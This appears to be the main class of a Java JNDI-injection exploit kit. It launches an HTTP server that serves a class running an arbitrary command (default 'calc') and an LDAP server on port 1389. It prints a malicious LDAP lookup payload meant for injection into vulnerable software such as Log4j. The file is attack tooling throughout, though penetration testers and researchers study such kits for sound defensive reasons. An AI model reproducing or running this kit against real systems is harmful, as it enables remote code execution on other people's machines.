package sec;

import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

public class Main {
    private static final Logger logger = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        try {
            String cmd;
            if (args.length == 0) {
                cmd = "calc";
            } else {
                cmd = args[0];
            }
            Logo.print();
            logger.info("start jndi kit");
            logger.info("cmd: " + cmd);
            new Thread(() -> Http.start(cmd)).start();
            new Thread(Ldap::start).start();
            Thread.sleep(1000);
            System.out.println("|--------------------------------------------------------|");
            System.out.println("|------Payload: ldap://127.0.0.1:1389/badClassName-------|");
            System.out.println("|--------------------------------------------------------|");
        } catch (Exception e) {
            logger.error(e.getMessage());
        }
    }
}
